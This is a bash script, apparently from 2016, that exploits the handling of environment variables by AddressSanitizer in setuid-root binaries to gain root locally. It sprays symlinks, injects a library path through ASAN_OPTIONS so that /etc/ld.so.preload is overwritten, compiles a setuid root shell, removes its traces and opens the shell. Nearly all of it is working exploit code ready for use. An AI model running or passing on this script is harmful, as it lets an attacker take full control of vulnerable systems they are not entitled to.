#!/bin/bash
# unsanitary.sh - ASAN/SUID Local Root Exploit
# Exploits er, unsanitized env var passing in ASAN
# which leads to file clobbering as root when executing
# setuid root binaries compiled with ASAN.
# Uses an overwrite of /etc/ld.so.preload to get root on
# a vulnerable system. Supply your own target binary to
# use for exploitation.
# Implements the bug found here: http://seclists.org/oss-sec/2016/q1/363
# Video of Exploitation: https://www.youtube.com/watch?v=jhSIm3auQMk
# Released under the Snitches Get Stitches Public Licence.
# Gr33tz to everyone in #lizardhq and elsewhere <3
# ~infodox (18/02/2016)
# FREE LAURI LOVE!
echo "Unsanitary - ASAN/SUID Local Root Exploit ~infodox (2016)"
if [[ $# -eq 0 ]] ; then
    echo "use: $0 /full/path/to/targetbin"
    echo "where targetbin is setuid root and compiled w/ ASAN"
    exit 0
fi
echo "[+] First, we create our shell and library..."
cat << EOF > /tmp/libhax.c
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
__attribute__ ((__constructor__))
void dropshell(void){
    chown("/tmp/rootshell", 0, 0);
    chmod("/tmp/rootshell", 04755);
    unlink("/etc/ld.so.preload");
    printf("[+] done!\n");
}
EOF
gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c
rm -f /tmp/libhax.c
cat << EOF > /tmp/rootshell.c
#include <stdio.h>
int main(void){
    setuid(0);
    setgid(0);
    seteuid(0);
    setegid(0);
    execvp("/bin/sh", NULL, NULL);
}
EOF
gcc -o /tmp/rootshell /tmp/rootshell.c
rm -f /tmp/rootshell.c
echo "[+] Now we drop our python symlink spraying tool..."
cat << EOF > sym.py
#!/usr/bin/python
import os
curpid=os.getpid()
print curpid
for x in range(0,100):
    newpid=curpid+x
    boom = "foo.%s" %(str(newpid))
    os.symlink("/etc/ld.so.preload", boom)
EOF
echo "[+] Spraying dir with symlinks..."
python sym.py
echo "[+] Hack the planet!"
ASAN_OPTIONS='suppressions="/hacktheplanet
/tmp/libhax.so
hacktheplanet" log_path=./foo verbosity=1' $1 >/dev/null 2>&1
$1 >/dev/null 2>&1
echo "[+] Tidy up a bit..."
rm -f foo*
rm -f sym.py
rm -f /tmp/libhax.so
echo "[<3] :PPpPpPpOpr000000t!"
/tmp/rootshell
